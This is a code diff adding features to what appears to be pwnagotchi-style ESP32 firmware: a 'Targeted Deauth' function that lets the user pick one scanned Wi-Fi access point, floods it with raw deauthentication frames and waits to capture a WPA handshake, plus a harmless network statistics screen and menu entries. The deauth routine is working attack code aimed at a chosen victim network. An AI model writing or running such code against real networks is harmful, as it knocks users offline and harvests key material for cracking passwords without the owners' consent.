@@ -157,6 +157,123 @@ void advertise(uint8_t channel) {
 
 void set_pwnagotchi_exit(bool new_value) { pwnagotchi_exit = new_value; }
 
+// MAC -> "AA:BB:CC:DD:EE:FF" string helper (BeaconList.MAC is char[6])
+static String dmMacStr(const char *m) {
+    char buf[18];
+    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
+             (uint8_t)m[0], (uint8_t)m[1], (uint8_t)m[2],
+             (uint8_t)m[3], (uint8_t)m[4], (uint8_t)m[5]);
+    return String(buf);
+}
+
+// ---------------------------------------------------------------------------
+// dmTargetedDeauth — pick ONE AP from the live scan, force-deauth just it,
+// then stay on its channel waiting for a handshake. Unlike the passive
+// auto-cycle, this guarantees the key material is attempted on your target.
+// Uses real wsl_bypasser_send_raw_frame + the sniffer handshake cache.
+// ---------------------------------------------------------------------------
+void dmTargetedDeauth() {
+    // Build a selectable list of APs (MAC + channel) from the live beacon set
+    std::vector<BeaconList> apList(registeredBeacons.begin(), registeredBeacons.end());
+    if (apList.empty()) { displayWarning("No APs seen yet", true); return; }
+
+    std::vector<Option> apOpts;
+    for (size_t i = 0; i < apList.size() && i < 24; i++) {
+        String label = dmMacStr(apList[i].MAC) + " ch" + String(apList[i].channel);
+        apOpts.push_back({label, [i]() {}, false});
+    }
+    apOpts.push_back({"Back", []() {}, false});
+    int pick = loopOptions(apOpts, MENU_TYPE_SUBMENU, "Target AP");
+    if (pick < 0 || pick >= (int)apList.size()) return;
+
+    auto &tgt = apList[pick];
+    uint8_t tchan = tgt.channel ? tgt.channel : 1;
+    uint64_t tkey = bruceMacToKey(tgt.MAC);
+    String tgtMac = dmMacStr(tgt.MAC);
+
+    // Clear the menu, draw a targeting screen
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.drawCentreString("LOCKED ON", tftWidth / 2, 8, 1);
+    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
+    tft.drawCentreString(tgtMac, tftWidth / 2, 30, 1);
+    tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
+    tft.drawCentreString("Deauthing on ch" + String(tchan) + " ...", tftWidth / 2, 50, 1);
+    tft.drawCentreString("PWR to stop", tftWidth / 2, tftHeight - 20, 1);
+
+    esp_wifi_set_channel(tchan, WIFI_SECOND_CHAN_NONE);
+    vTaskDelay(50 / portTICK_PERIOD_MS);
+
+    // Hammer the target with deauths, watch for a handshake
+    setMood(0, "(>__<)", "Locked: " + tgtMac);
+    updateUi(true);
+    unsigned long t0 = millis();
+    int deauthCount = 0;
+    while (!check(EscPress) && !pwnagotchi_exit && millis() - t0 < 15000) {
+        // send a directed deauth to the target (broadcast + its MAC)
+        memcpy(&ap_record.bssid, tgt.MAC, 6);
+        wsl_bypasser_send_raw_frame(&ap_record, tchan, _default_target);
+        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+        deauthCount++;
+
+        // quick blip animation on the screen while we hammer
+        if (deauthCount % 5 == 0) {
+            tft.drawCentreString("deauth x" + String(deauthCount), tftWidth / 2, tftHeight - 40, 1);
+        }
+
+        // did we catch a handshake from this target?
+        if (sniffer_is_handshake_ready(tkey)) {
+            setMood(0, "(O__O)", "HANDSHAKE from target!");
+            updateUi(true);
+            drawHandshakeCaught();
+            vTaskDelay(900 / portTICK_PERIOD_MS);
+            break;
+        }
+        vTaskDelay(150 / portTICK_PERIOD_MS);
+    }
+
+    // return to the recon UI
+    tft.fillScreen(bruceConfig.bgColor);
+    setMood(8, "(-@_@)", "Targeting done (" + String(deauthCount) + " deauths)");
+    updateUi(true);
+}
+
+// ---------------------------------------------------------------------------
+// dmNetStats — live air-traffic summary: AP count, per-channel density,
+// deauth attempts, handshakes. Pure recon readout, no radio change.
+// ---------------------------------------------------------------------------
+void dmNetStats() {
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.drawCentreString("NET STATS", tftWidth / 2, 8, 1);
+    tft.setTextSize(1);
+
+    int y = 22;
+    auto line = [&](const String &s) { tft.drawString(s, 8, y, 1); y += 14; };
+
+    line("APs seen:  " + String((int)registeredBeacons.size()));
+    line("Channels:  " + String((int)active_channels_size));
+
+    // per-channel density
+    std::map<uint8_t, int> chanCount;
+    for (const auto &b : registeredBeacons) chanCount[b.channel]++;
+    int chIdx = 0;
+    for (const auto &p : chanCount) {
+        if (chIdx++ >= 8) break;
+        line("ch" + String(p.first) + ": " + String(p.second) + " APs");
+    }
+
+    line("Handshakes: " + String(num_HS));
+    line("Decoys:     (pwngrid active)");
+
+    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
+    tft.drawCentreString("PWR to close", tftWidth / 2, tftHeight - 16, 1);
+    while (!check(EscPress) && !check(AnyKeyPress)) vTaskDelay(50);
+
+    tft.fillScreen(bruceConfig.bgColor);
+    updateUi(true);
+}
+
 // ---------------------------------------------------------------------------
 // RECON phase — hop all channels, build sorted AP list
 // ---------------------------------------------------------------------------
@@ -381,6 +498,8 @@ void detective_mopie_start() {
         if (check(SelPress)) {
             String channel_status = use_all_channels ? "All Ch: ON" : "All Ch: OFF";
             options = {
+                {"Targeted Deauth", [&]() { dmTargetedDeauth(); }},
+                {"Net Stats", [&]() { dmNetStats(); }},
                 {"Find friends", yield},
                 {"Net beacon", send_pwnagotchi_beacon_main},
                 {channel_status.c_str(), toggle_all_channels},
